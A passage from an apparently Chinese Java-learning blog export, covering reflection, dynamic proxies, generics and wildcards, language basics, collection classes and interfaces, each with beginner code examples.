获取私有构造器 Constructor cons = clazz.getDeclaredConstructor(int.class);、 // 允许反射获取，获取私有结构时必须添加本行 cons.setAccessible(true); Person p3 = (Person) cons.newInstance(50); System.out.println(p3); } } class Person { public String name; public int age; private final int weight; public Person(String name, int age, int weight) { this(weight); this.name = name; this.age = age; } private Person(int weight) { this.weight = weight; } public void sayName() { System.out.println(name); } public void setAge(int age) { this.age = age; } private void sayWeight() { System.out.println(weight); } @Override public String toString() { return \u0026#34;Person{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#34;, weight=\u0026#34; + weight + \u0026#39;}\u0026#39;; } } 七、动态代理 我们知道，在 Java 程序中所有interface类型的变量总是通过向上转型并指向某个实例的。\n那么有没有可能不编写实现类，直接在运行期创建某个interface的实例呢？\n这是可能的，因为Java标准库提供了一种动态代理（Dynamic Proxy）的机制：可以在运行期动态创建某个interface的实例。\n在运行期动态创建一个interface实例的方法如下：\n定义一个InvocationHandler实例，它负责实现接口的方法调用； 通过Proxy.newProxyInstance()创建interface实例，它需要3个参数： 使用的ClassLoader，通常就是接口类的ClassLoader； 需要实现的接口数组，至少需要传入一个接口进去； 用来处理接口方法调用的InvocationHandler实例。 将返回的Object强制转型为接口。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; public class Demo { public static void main(String[] args) throws Exception { InvocationHandler handler = (proxy , method , args1) -\u0026gt; { System.out.println(method); if (method.getName().equals(\u0026#34;morning\u0026#34;)) { System.out.println(\u0026#34;Good morning, \u0026#34; + args1[0]); } return null; }; Hello hello = (Hello) Proxy.newProxyInstance( Hello.class.getClassLoader(), // 传入ClassLoader new Class[] { Hello.class }, // 传入要实现的接口 handler); // 传入处理调用方法的InvocationHandler hello.morning(\u0026#34;Bob\u0026#34;); } } interface Hello { void morning(String name); } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%8F%8D%E5%B0%84/","title":"Java学习之路——反射"},{"content":"Java学习之路——泛型 概述 什么是泛型？Java 泛型（generics）是 JDK 5 中引入的一个新特性, 泛型提供了编译时类型安全检测机制，该机制允许程序员在编译时检测到非法的类型。\n泛型的本质是参数化类型，也就是说所操作的数据类型被指定为一个参数。\n泛型的本质是为了参数化类型（在不创建新的类型的情况下，通过泛型指定的不同类型来控制形参具体限制的类型）。也就是说在泛型使用过程中，操作的数据类型被指定为一个参数，这种参数类型可以用在类、接口和方法中，分别被称为泛型类、泛型接口、泛型方法。\n一、泛型方法 泛型方法可以在调用时可以接收不同类型的参数。编译器会根据传递给泛型方法的参数类型，适当地处理每一个方法调用。\n定义泛型方法时要遵循如下规则：\n泛型方法需要声明都有一个类型参数声明部分（由尖括号分隔），该类型参数声明部分在方法返回类型之前； 每一个类型参数声明部分包含一个或多个类型参数，参数间用逗号隔开。一个泛型参数，也被称为一个类型变量，是用于指定一个泛型类型名称的标识符； 类型参数能被用来声明返回值类型，并且能作为泛型方法得到的实际参数类型的占位符； 类型参数只能代表引用数据类型，不能用于基本数据类型； 泛型方法体的声明和其他方法一样。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class Demo { public static void main(String[] args) { Integer[] a1 = {1, 2, 3}; Double[] a2 = {1.0, 2.0, 3.0}; Character[] a3 = {\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;}; Demo.print(a1); // 1 2 3 Demo.print(a2); // 1.0 2.0 3.0 Demo.print(a3); // a b c } public static \u0026lt;E\u0026gt; E[] print(E[] input) { for (E i : input) { System.out.print(i + \u0026#34; \u0026#34;); } System.out.println(); return input; // 返回值也为泛型 } } 二、泛型类 泛型类的类型参数声明部分也包含一个或多个类型参数，参数间用逗号隔开。\n一个泛型参数，也被称为一个类型变量，是用于指定一个泛型类型名称的标识符。因为他们接受一个或多个参数，这些类被称为参数化的类或参数化的类型。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import java.util.Arrays; public class Demo { public static void main(String[] args) { Integer[] a1 = {1, 2, 3}; Box\u0026lt;Integer[]\u0026gt; b1 = new Box\u0026lt;\u0026gt;(a1); System.out.println(Arrays.toString(b1.getT())); Character[] a2 = {\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;}; Box\u0026lt;Character[]\u0026gt; b2 = new Box\u0026lt;\u0026gt;(a2); System.out.println(Arrays.toString(b2.getT())); } } class Box\u0026lt;T\u0026gt; { private final T t; public Box(T t) { this.t = t; } public T getT() { return t; } } 三、泛型接口 实现泛型接口同样也只需在接口名后面加上 \u0026lt;类型名\u0026gt;就行。\n但是实现接口的类就有两种方式了：\n如果实现接口的子类不想使用泛型声明，则在实现接口的时候直接指定好其具体的操作类型即可。例如 MyClass1；\n如果实现接口的子类想要使用泛型声明，则在实现接口的时候同样使用泛型。例如 MyClass2。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 public class Demo { public static void main(String[] args) { MyClass1 m1 = new MyClass1(\u0026#34;Hello\u0026#34;); System.out.println(m1.getValue());; MyClass2\u0026lt;Integer\u0026gt; m2 = new MyClass2\u0026lt;\u0026gt;(1); System.out.println(m2.getValue());; } } interface info\u0026lt;T\u0026gt; { T getValue(); } // 指定具体的类 class MyClass1 implements info\u0026lt;String\u0026gt; { private final String value; public MyClass1(String value) { this.value = value; } @Override public String getValue() { return value; } } // 泛型类 class MyClass2\u0026lt;T\u0026gt; implements info\u0026lt;T\u0026gt; { private final T value; public MyClass2(T value) { this.value = value; } @Override public T getValue() { return value; } } 四、通配符 我们在使用繁花时，由于等号左右的泛型需要一致，但你可能不知道等号右侧的泛型是什么。这个时候 Java 就为我们提供了泛型通配符，它等号左侧可以使用。\n在理解通配符之前，我们首先要理解 Java 的引用和实例之间的关系：\n在 Java 中，引用就相当于一个容器，而实例就相当于容器里的水。正常情况下，水只能往和自己体积相等或者比自己体积大的容器里面装（向上转型：子类的实例装入父类的容器）。但是也可以往比自己小的容器里面装（向下转型：父类的实例装入子类的容器），但是这一步就十分凶险，会有众多的限制条件。而泛型就是为了解决不安全的向下转型问题。\n下面我们就用水果盘和水果的关系来讲解通配符：\n首先创建一个盘子类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 // 水果盘类 class Plate\u0026lt;T\u0026gt; { private T item; public Plate(T item) { this.item = item; } public void set(T item) { this.item = item; } public T get(){ return item; } } 然后再创建一点水果：\n1 2 3 4 5 6 // 水果类 class Fruit {} // 具体的水果 class Apple extends Fruit {} class Banana extends Fruit {} 无边界通配符 使用无边界通配符可以让泛型接收任意类型的数据。相当于 \u0026lt;? extends Object\u0026gt;，可以匹配一切类。\n1 2 3 4 5 6 7 8 9 10 11 12 13 Plate\u0026lt;?\u0026gt; p1 = new Plate\u0026lt;\u0026gt;(new Fruit()); // p1.set(new Fruit()); // p1.set(new Apple()); Object p11 = p1.get(); // Fruit p12 = p1.get(); // Apple p13 = p1.get(); Plate\u0026lt;?\u0026gt; p2 = new Plate\u0026lt;\u0026gt;(new Apple()); // p2.set(new Fruit()); // p2.set(new Apple()); Object p21 = p1.get(); // Fruit p22 = p1.get(); // Apple p23 = p1.get(); 无边界通配符匹配任意类。\n它既不能使用 set 方法。因为不知道盘子里面的容器有多大，如果盘子里面的容器比较小，你放进入一个大的东西就会出问题，或者说盘子里面的容器根本就和你要放的东西没有关系，那就更会出问题了；\n也不能将取出的结果放入任 Object 类以外的任何类。因为你不知道盘子里面的东西有多大，你如果拿的容器和放里面的东西没有任何关系，或者尺寸比里面的小了，那么都会出问题。调用 Object 来接收就没问题，因为它就是最大的容器了，不管你里面放的是什么，都可以接得住。\n总结而言就是：不能往里存，也不能往外取。\n上边界通配符 使用固定上边界的通配符的泛型可以接收指定类型及其所有子类类型的数据，这里的指定类型可以是类也可以是接口。\n1 2 3 4 5 6 Plate\u0026lt;? extends Fruit\u0026gt; p3 = new Plate\u0026lt;\u0026gt;(new Fruit()); // p3.set(new Fruit()); // p3.set(new Apple()); Fruit p31 = p3.get(); Object p32 = p3.get(); // Apple p33 = p3.get(); 上边界边界符可以匹配一切以该类为父类的派生类或者类本身。\n它不能调用 set 方法。因为虚拟机只知道它放进入的是父类的派生类或者父类，具体哪一个类不知道，如果初始是子类，放的时候放父类，那么就会存在问题，因此它不能调用 set 方法；\n但是它可以调用 get 方法，因为知道容器内部的都是父类或者父类的派生类，因此取的时候只要找一个大于等于父类的容器就绝对可以装的下。\n总结而言就是：不能往里存，只能往外取。\n下边界通配符 所有固定下边界的通配符的泛型可以接收指定类型及其所有超类类型的数据。\n1 2 3 4 5 6 Plate\u0026lt;? super Fruit\u0026gt; p4 = new Plate\u0026lt;\u0026gt;(new Fruit()); p4.set(new Fruit()); p4.set(new Apple()); // Fruit p41 = p4.get(); Object p42 = p4.get(); // Apple p43 = p4.get(); 它可以调用 set 方法。因为虚拟机知道，盘子里的容器最小也是 Fruit 类这么大，那么我放东西的时候，只要放的东西是小于或者等于 Fruit 类大小的，那就不会出问题；\n但是它不能调用 get 方法，因为虚拟机不知道里面的东西有多大，如果你接的容器比里面的小了就会出问题，但是如果拿 Object 接就不会有问题，因为 Object 就是最大的状态了。\nPECS原则 PECS（Producer Extends Consumer Super）原则：\n频繁往外读取内容的，适合用上界Extends。 经常往里插入的，适合用下界Super。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E6%B3%9B%E5%9E%8B/","title":"Java学习之路——泛型"},{"content":"Java学习之路——基础知识 一、标识符 1. 什么是标识符？ 标识符（identifier）是指用来标识某个实体的一个符号，在不同的应用环境下有不同的含义。在计算机编程语言中，标识符是用户编程时使用的名字，用于给变量、常量、函数、语句块等命名，以建立起名称与使用之间的关系。标识符通常由字母和数字以及其它字符构成。\n2. 标识符的命名规则 在 Java程序中，标识符命名存在着以下规则，若不遵守这些规则，编译器会报错：\n只能以 数字、字母、_和$ 进行命名（一般而言不使用 $ 进行命名）； 标识符不能以数字开头 标识符严格区分大小写 关键字不能用作标识符 3. 标识符的命名规范 好的标识符命名规范会让程序变的通俗易懂，养成好的命名习惯对于一个优秀的程序员来说必不可少。\n下面这些都是标识符命名的好习惯：\n标识符命名应当见名知意 标识符应当遵守驼峰命名法 类名、接口名的首字母大写，后面每个单词首字母大写 变量名、方法名首字母小写，后面每个单词首字母大写 常量名全部大写 二、关键字 1. 什么是关键字？ Java关键字是电脑语言里事先定义的，有特别意义的标识符，有时又叫保留字，还有特别意义的变量。Java的关键字对Java的编译器有特殊的意义，他们用来表示一种数据类型，或者表示程序的结构等，关键字不能用作变量名、方法名、类名、包名和参数。\n2. 常见关键字及其用途 关键字 含义 abstract 表明类或者成员方法具有抽象属性 assert 断言，用来进行程序调试 boolean 基本数据类型之一，声明布尔类型的关键字 break 提前跳出一个块 byte 基本数据类型之一，字节类型 case 用在switch语句之中，表示其中的一个分支 catch 用在异常处理中，用来捕捉异常 char 基本数据类型之一，字符类型 class 声明一个类 const 保留关键字，没有具体含义 continue 回到一个块的开始处 default 默认，例如，用在switch语句中，表明一个默认的分支。Java8 中也作用于声明接口函数的默认实现 do 用在do-while循环结构中 double 基本数据类型之一，双精度浮点数类型 else 用在条件语句中，表明当条件不成立时的分支 enum 枚举 extends 表明一个类型是另一个类型的子类型。对于类，可以是另一个类或者抽象类；对于接口，可以是另一个接口 final 用来说明最终属性，表明一个类不能派生出子类，或者成员方法不能被覆盖，或者成员域的值不能被改变，用来定义常量 finally 用于处理异常情况，用来声明一个基本肯定会被执行到的语句块 float 基本数据类型之一，单精度浮点数类型 for 一种循环结构的引导词 goto 保留关键字，没有具体含义 if 条件语句的引导词 implements 表明一个类实现了给定的接口 import 表明要访问指定的类或包 instanceof 用来测试一个对象是否是指定类型的实例对象 int 基本数据类型之一，整数类型 interface 接口 long 基本数据类型之一，长整数类型 native 用来声明一个方法是由与计算机相关的语言（如C/C++/FORTRAN语言）实现的 new 用来创建新实例对象 package 包 private 一种访问控制方式：私用模式 protected 一种访问控制方式：保护模式 public 一种访问控制方式：共用模式 return 从成员方法中返回数据 short 基本数据类型之一,短整数类型 static 表明具有静态属性 strictfp 用来声明FP_strict（单精度或双精度浮点数）表达式遵循[IEEE 754](https://baike.baidu.com/item/IEEE 754)算术规范 super 表明当前对象的父类型的引用或者父类型的构造方法 switch 分支语句结构的引导词 synchronized 表明一段代码需要同步执行 this 指向当前实例对象的引用 throw 抛出一个异常 throws 声明在当前定义的成员方法中所有需要抛出的异常 transient 声明不用序列化的成员域 try 尝试一个可能抛出异常的程序块 void 声明当前成员方法没有返回值 volatile 表明两个或者多个变量必须同步地发生变化 while 用在循环结构中 三、字面值 1. 什么是字面值？ 字面值是指在程序中无需变量保存，可直接表示为一个具体的数字或字符串的值。\n字面值大体上可以分为整型字面值、浮点字面值、字符和字符串字面值、特殊字面值。\n2. 整型字面值 1 2 3 4 int a1 = 1; // 十进制 int a2 = 0b1; // 二进制 int a3 = 0x1; // 十六进制 long a4 = 100L; // 表示long型数字时，后面需要带上 \u0026#34;l\u0026#34;或者\u0026#34;L\u0026#34;，一般使用\u0026#34;L\u0026#34;便于区分 3. 浮点型字面值 1 2 3 double b1 = 10.1; // 小数 double b2 = 1.2E2; // 科学计数法表示 float b3 = 10.1F; // 表示为float型浮点数时，需要在数字后面加 \u0026#34;f\u0026#34;或者\u0026#34;F\u0026#34; 4. 字符及字符串型字面值 1 2 char c1 = \u0026#39;a\u0026#39;; // 字符型字面值需要用单引号包裹,并且只能为一个字符 String c2 = \u0026#34;abc\u0026#34;; // 字符串型字面值需要用双引号包裹 5. 布尔型字面值 1 2 boolean a1 = true; // 真 boolean a2 = false; // 假 6. 特殊字面值 null：是一种特殊的类型（type），可以将它赋给任何引用类型变量，表示这个变量不引用任何东西。如果一个引用类型变量为null，表示这个变量不可用。 Class literal：它是由类，接口，数组或原始类型的名称或伪类型void组成的表达式，后面紧跟 \u0026ldquo;.class\u0026quot;。Class literal用于表示类型本身！ 1 2 3 4 5 6 System.out.println(String.class); System.out.println(Integer.class); out: class java.lang.String class java.lang.Integer 7. 数值型字面值中使用下划线 在 JDK7 以后的版本中，可以在数值型字面值（包括整型字面值和浮点字面值）插入一个或者多个下划线。下划线只能用于分隔数字，不能分隔字符与字符，也不能分隔字符与数字。\n1 2 int a1 = 123_456; double a2 = 12_3.4_56; ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","title":"Java学习之路——基础知识"},{"content":"Java学习之路——集合 概述 集合的定义 什么是集合（Collection）？集合就是“由若干个确定的元素所构成的整体”。\n从概念上来看集合和数组是十分相似的，那么为什么有了数组还要集合呢？\n数组初始化后大小不可变； 数组只能按索引顺序存取； \u0026hellip;\u0026hellip; 正因为数组有着上述的缺点，因此在 Java 中又提供了集合来让我们使用。\n集合的种类及特点 Java标准库自带的java.util包提供了集合类：Collection，它是除Map外所有其他集合类的根接口。Java 的java.util包主要提供了以下三种类型的集合：\nList：一种有序列表的集合； Set：一种保证没有重复元素的集合； Map：一种通过键值（key-value）查找的映射表集合。 Java 集合有以下特点：\n接口和实现类相分离； 二是支持泛型，我们可以限制在一个集合中只能放入同一种数据类型的元素。 Java 访问集合是通过统一的方式——迭代器（Iterator）来实现，有了它我们就可以只关心上层使用而不用关心下层的集合类型。\n一、Collection接口常用方法 1. 添加元素 add(int index，E element)：向集合中添加一项；\nindex（可选参数）- 表示元素所插入处的索引值；\nelement - 要插入的元素；\n返回值：如果成功插入元素，返回 true；\n如果 index 超出范围，则该 add() 方法抛出 IndexOutOfBoundsException 异常。\naddAll(int index, Collection c)：\nindex（可选参数）- 表示元素所插入处的索引值；\nc - 要插入的集合元素；\n返回值：如果成功插入元素，返回 true；\n如果给定的集合为 null，则超出 NullPointerException 异常；\n如果 index 超出范围，则该 add() 方法抛出 IndexOutOfBoundsException 异常。\n2. 获取有效元素个数 size()：返回数组中元素的个数。 返回值：返回数组中元素的个数。 3. 清空集合 clear()：删除动态集合中的所有元素。 4. 是否为空集 isEmpty()：判断集合是否为空。\n返回值：如果数组中不存在任何元素，则返回 true；\n如果数组中存在元素，则返回 false。\n5. 是否包含某个元素 contains(Object obj)：用于判断元素是否在集合中；\nobj - 要检测的元素；\n返回值：如果指定的元素存在于动态数组中，则返回 true；\n如果指定的元素不存在于动态数组中，则返回 false。\ncontainsAll(Collection c)：检测集合是否包含指定集合中的所有元素。\ncollection - 集合参数； 返回值：如果动态数组中包含的集合中的所有元素，则返回 true； 如果集合中存在的元素与指定 Collection 中的元素不兼容，则抛出 ClassCastException； 如果 collection 中包含 null 元素，并且集合中不允许 null值，则抛出 NullPointerException 异常。 6. 删除元素 remove(Object obj / int index)：删除集合里的单个元素；\nobj - 要删除的元素，如果 obj 元素出现多次，则删除在数组中第一次出现的元素；\nindex - 要删除元素索引值；\n返回值：如果传入元素，删除成功，则返回 true；\n如果传入索引值，则返回删除的元素；\n如果指定的索引超出范围，则该方法将抛出 IndexOutOfBoundsException 异常。\nremoveAll(Collection c)：删除存在于指定集合中的动态数组元素。\nc - 动态数组列表中要删除的元素集合；\n返回值：如果从集合成功删除元素返回 true；\n如果集合中存在的元素类与指定 Collection 的元素类不兼容，则抛出 ClassCastException 异常；\n如果集合中包含 null 元素，并且指定 Collection 不允许 null 元素，则抛出 NullPointerException 异常。\n7. 求交集 retainAll(Collection c)：保留 ArrayList中在指定集合中也存在的那些元素。\ncollection - 集合参数；\n返回值：如果集合中删除了元素则返回 true；\n如果集合中存在的元素与指定 Collection 的类中元素不兼容，则抛出 ClassCastException 异常；\n如果集合包含 null 元素，并且指定 Collection 不允许 null 元素，则抛出 NullPointerException。\n8. 判断集合是否相等 eauqls(Collection c)：判断两个集合是否相等。 collection - 集合参数； 返回值：如果两个集合相等则返回 true。 9. 转换成数组 toArray(T[] arr)：将集合对象转换为数组。\nT [] arr（可选参数）- 用于存储数组元素的数组；\n返回值：如果参数 T[] arr 作为参数传入到方法，则返回 T 类型的数组；\n如果未传入参数，则返回 Object 类型的数组。\n10. 获取集合对象的哈希值 hashCode()：返回集合哈希值。 11. 遍历集合 iterator()：返回 Iterator 接口的实例，用于遍历集合。 二、使用 Iterator 接口遍历集合 在 Java 程序中，Iterator（迭代器）不是一个集合，它是一种用于访问集合的方法。\nGoF 对迭代器的定义为：提供一种方法访问一个容器（container）对象中的各个元素，而又不需要暴露该对象的内部细节。\n1. 迭代器常用方法 next()：返回迭代器的下一个元素，并且更新迭代器的状态； hasNext()：用于检测集合中是否还有元素。有则 true，没有则 false； remove()：将迭代器返回的元素删除。 2. 获取一个迭代器 想要使用迭代器对象遍历集合，那么首先就需要获取一个迭代器。可以调用集合的 iterator() 方法获取一个迭代器。\n1 2 3 4 5 6 7 8 9 10 // 创建集合 Collection collection = new ArrayList(); // 添加元素 collection.add(123); collection.add(\u0026#34;123\u0026#34;); collection.add(123L); collection.add(\u0026#39;A\u0026#39;); Iterator iterator = collection.iterator(); 3. 遍历集合 使用迭代器遍历集合实质上就是不断调用 next() 方法的过程。当集合中的元素都已经遍历完后，此时再调用 next() 方法就会抛出 NoSuchElementException错误。\n因此推介使用如下方式进行遍历：\n1 2 3 while (iterator.hasNext()) { System.out.println(iterator.next()); } 三、常用集合类 以下是我们日常开发中，使用较多的四种集合：\nLinkedList：该类实现了List接口，允许有 null（空）元素。主要用于创建链表数据结构，该类没有同步方法，如果多个线程同时访问一个List，则必须自己实现访问同步，解决方法就是在创建List时候构造一个同步的List； ArrayList：该类也是实现了List的接口，实现了可变大小的数组，随机访问和遍历元素时，提供更好的性能。该类也是非同步的，在多线程的情况下不要使用。其插入删除效率低； HashSet：该类实现了Set接口，不允许出现重复元素，不保证集合中元素的顺序，允许包含值为null的元素，但最多只能一个； HashMap：HashMap 是一个散列表，它存储的内容是键值对(key-value)映射。该类实现了Map接口，根据键的HashCode 值存储数据，具有很快的访问速度，最多允许一条记录的键为null，不支持线程同步。 1. LinkedList 示例 1 2 3 4 5 6 7 8 9 10 11 12 import java.util.LinkedList; public class Demo { public static void main(String[] args) { LinkedList\u0026lt;String\u0026gt; sites = new LinkedList\u0026lt;String\u0026gt;(); sites.add(\u0026#34;Google\u0026#34;); sites.add(\u0026#34;Runoob\u0026#34;); sites.add(\u0026#34;Taobao\u0026#34;); sites.add(\u0026#34;Weibo\u0026#34;); System.out.println(sites); // [Google, Runoob, Taobao, Weibo] } } 常用方法 方法 描述 public boolean add(E e) 链表末尾添加元素，返回是否成功，成功为 true，失败为 false。 public void add(int index, E element) 向指定位置插入元素。 public boolean addAll(Collection c) 将一个集合的所有元素添加到链表后面，返回是否成功，成功为 true，失败为 false。 public boolean addAll(int index, Collection c) 将一个集合的所有元素添加到链表的指定位置后面，返回是否成功，成功为 true，失败为 false。 public void addFirst(E e) 元素添加到头部。 public void addLast(E e) 元素添加到尾部。 public boolean offer(E e) 向链表末尾添加元素，返回是否成功，成功为 true，失败为 false。 public boolean offerFirst(E e) 头部插入元素，返回是否成功，成功为 true，失败为 false。 public boolean offerLast(E e) 尾部插入元素，返回是否成功，成功为 true，失败为 false。 public void clear() 清空链表。 public E removeFirst() 删除并返回第一个元素。 public E removeLast() 删除并返回最后一个元素。 public boolean remove(Object o) 删除某一元素，返回是否成功，成功为 true，失败为 false。 public E remove(int index) 删除指定位置的元素。 public E poll() 删除并返回第一个元素。 public E remove() 删除并返回第一个元素。 public boolean contains(Object o) 判断是否含有某一元素。 public E get(int index) 返回指定位置的元素。 public E getFirst() 返回第一个元素。 public E getLast() 返回最后一个元素。 public int indexOf(Object o) 查找指定元素从前往后第一次出现的索引。 public int lastIndexOf(Object o) 查找指定元素最后一次出现的索引。 public E peek() 返回第一个元素。 public E element() 返回第一个元素。 public E peekFirst() 返回头部元素。 public E peekLast() 返回尾部元素。 public E set(int index, E element) 设置指定位置的元素。 public Object clone() 克隆该列表。 public Iterator descendingIterator() 返回倒序迭代器。 public int size() 返回链表元素个数。 public ListIterator listIterator(int index) 返回从指定位置开始到末尾的迭代器。 public Object[] toArray() 返回一个由链表元素组成的数组。 public T[] toArray(T[] a) 返回一个由链表元素转换类型而成的数组。 2. ArrayList 示例 1 2 3 4 5 6 7 8 9 10 11 12 import java.util.ArrayList; public class Demo { public static void main(String[] args) { ArrayList\u0026lt;String\u0026gt; sites = new ArrayList\u0026lt;String\u0026gt;(); sites.add(\u0026#34;Google\u0026#34;); sites.add(\u0026#34;Runoob\u0026#34;); sites.add(\u0026#34;Taobao\u0026#34;); sites.add(\u0026#34;Weibo\u0026#34;); System.out.println(sites); // [Google, Runoob, Taobao, Weibo] } } 常用方法 方法 描述 add() 将元素插入到指定位置的 ArrayList中 addAll() 添加集合中的所有元素到 ArrayList中 clear() 删除 ArrayList中的所有元素 clone() 复制一份 ArrayList contains() 判断元素是否在 ArrayList get() 通过索引值获取 ArrayList中的元素 indexOf() 返回 ArrayList中元素的索引值 removeAll() 删除存在于指定集合中的 ArrayList里的所有元素 remove() 删除 ArrayList里的单个元素 size() 返回 ArrayList里元素数量 isEmpty() 判断 ArrayList是否为空 subList() 截取部分 ArrayList的元素 set() 替换 ArrayList中指定索引的元素 sort() 对 ArrayList元素进行排序 toArray() 将 ArrayList转换为数组 toString() 将 ArrayList转换为字符串 ensureCapacity() 设置指定容量大小的 ArrayList lastIndexOf() 返回指定元素在 ArrayList中最后一次出现的位置 retainAll() 保留 ArrayList中在指定集合中也存在的那些元素 containsAll() 查看 ArrayList是否包含指定集合中的所有元素 trimToSize() 将 ArrayList中的容量调整为数组中的元素个数 removeRange() 删除 ArrayList中指定索引之间存在的元素 replaceAll() 将给定的操作内容替换掉数组中每一个元素 removeIf() 删除所有满足特定条件的 ArrayList元素 forEach() 遍历 ArrayList中每一个元素并执行特定操作 3. HashSet 示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 import java.util.HashSet; public class Demo { public static void main(String[] args) { HashSet\u0026lt;String\u0026gt; sites = new HashSet\u0026lt;String\u0026gt;(); sites.add(\u0026#34;Google\u0026#34;); sites.add(\u0026#34;Runoob\u0026#34;); sites.add(\u0026#34;Taobao\u0026#34;); sites.add(\u0026#34;Zhihu\u0026#34;); sites.add(\u0026#34;Runoob\u0026#34;); // 重复的元素不会被添加 sites.remove(\u0026#34;Taobao\u0026#34;); // 删除元素，删除成功返回 true，否则为 false System.out.println(sites); // [Google, Runoob, Zhihu] } } 常用方法 方法 描述 add() 添加元素 remove() 删除元素 clear() 删除所有元素 contains() 是否包含指定元素 isEmpty() 判断是否为空 size() 获取集合中元素个数 4. HashMap 示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 import java.util.HashMap; public class Demo { public static void main(String[] args) { // 创建 HashMap 对象 Sites HashMap\u0026lt;Integer, String\u0026gt; Sites = new HashMap\u0026lt;Integer, String\u0026gt;(); // 添加键值对 Sites.put(1, \u0026#34;Google\u0026#34;); Sites.put(2, \u0026#34;Runoob\u0026#34;); Sites.put(3, \u0026#34;Taobao\u0026#34;); Sites.put(4, \u0026#34;Zhihu\u0026#34;); System.out.println(Sites); // {1=Google, 2=Runoob, 3=Taobao, 4=Zhihu} } } 常用方法 方法 描述 clear() 删除 HashMap 中的所有键/值对 clone() 复制一份 HashMap isEmpty() 判断 HashMap是否为空 size() 计算 HashMap中键/值对的数量 put() 将键/值对添加到 HashMap中 putAll() 将所有键/值对添加到 HashMap中 putIfAbsent() 如果 HashMap中不存在指定的键，则将指定的键/值对插入到 HashMap中。 remove() 删除 HashMap中指定键 key 的映射关系 containsKey() 检查 HashMap中是否存在指定的 key 对应的映射关系。 containsValue() 检查 HashMap中是否存在指定的 value 对应的映射关系。 replace() 替换 HashMap中是指定的 key 对应的 value。 replaceAll() 将 HashMap中的所有映射关系替换成给定的函数所执行的结果。 get() 获取指定 key 对应对 value getOrDefault() 获取指定 key 对应对 value，如果找不到 key ，则返回设置的默认值 forEach() 对 HashMap中的每个映射执行指定的操作。 entrySet() 返回 HashMap中所有映射项的集合集合视图。 keySet() 返回 HashMap中所有 key 组成的集合视图。 values() 返回 HashMap中存在的所有 value 值。 merge() 添加键值对到 HashMap中 compute() 对 HashMap中指定 key 的值进行重新计算 computeIfAbsent() 对 HashMap中指定 key 的值进行重新计算，如果不存在这个 key，则添加到 HashMap中 computeIfPresent() 对 HashMap中指定 key 的值进行重新计算，前提是该 key 存在于 HashMap中。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E9%9B%86%E5%90%88/","title":"Java学习之路——集合"},{"content":"Java学习之路——接口 概述 总所周知，我们是父母的孩子。我们的身上既继承了爸爸的基因也继承了妈妈的基因。这就是多继承。\n然而在 Java 程序中，是不支持多继承的。Java 仅仅支持单继承。但是接口为我们提供了一种实现多继承的可能性！\n接口（英文：Interface）：在JAVA编程语言中接口是一个抽象类型，是抽象方法的集合，接口通常以 interface 来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。\n我们要明确，**接口并不是类！接口和类是并列的结构！**只是编写接口的方式和类很相似，但是它们属于不同的概念。类描述对象的属性和方法。接口则包含类要实现的方法。\n除非实现接口的类是抽象类，否则该类要定义接口中的所有方法。\n接口无法被实例化，但是可以被实现。一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类。另外，在 Java 中，接口类型可用来声明一个变量，他们可以成为一个空指针，或是被绑定在一个以此接口实现的对象。\n一、接口的定义及实现 JDK7以前，接口中只能定义全局常量和抽象方法；JDK8后，接口中除了可以定义全局常量和抽象方法之外，还可以定义静态方法，默认方法等。\n实现接口的类必须实现接口所有的抽象方法，而静态方法，默认方法等不需要实现。接口中的静态方法，默认方法等只能通过接口调用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // 定义一个接口 interface Flyable { // 全局常量 // 两种方式效果相同，一般书写时省略前面的 public static final public static final int MAX_SPEED = 7900; int MIN_SPEED = 0; // 抽象方法 // 两种方式效果相同，一般书写时省略前面的 public abstract public abstract void fly(); void stop(); } class Bird implements Flyable { @Override public void fly() { System.out.println(\u0026#34;I can fly.\u0026#34;); } @Override public void stop() { } } 二、接口的继承 一个接口能继承另一个接口，和类之间的继承方式比较相似。接口的继承使用extends关键字，子接口继承父接口的方法。\n实现的类必须实现所有的接口（包括接口继承的接口）才能进行实例化。\n单继承 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // 定义一个接口 interface Flyable { public abstract void fly(); void stop(); } // 继承一个接口 interface Bird extends Flyable { void eatBug(); } // 实现接口 class Sparrow implements Bird { @Override public void fly() { } @Override public void stop() { } @Override public void eatBug() { } } 多继承 在Java中，类的多继承是不合法，但接口允许多继承。在接口的多继承中 extends 关键字只需要使用一次，在其后跟着继承接口即可实现多继承。\n通过接口的多继承，即可实现类的多继承。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // 定义一个接口 interface Flyable { void fly(); } interface Reproduction { void breedingOffspring(); } // 继承一个接口 interface Bird extends Flyable, Reproduction { void eatBug(); 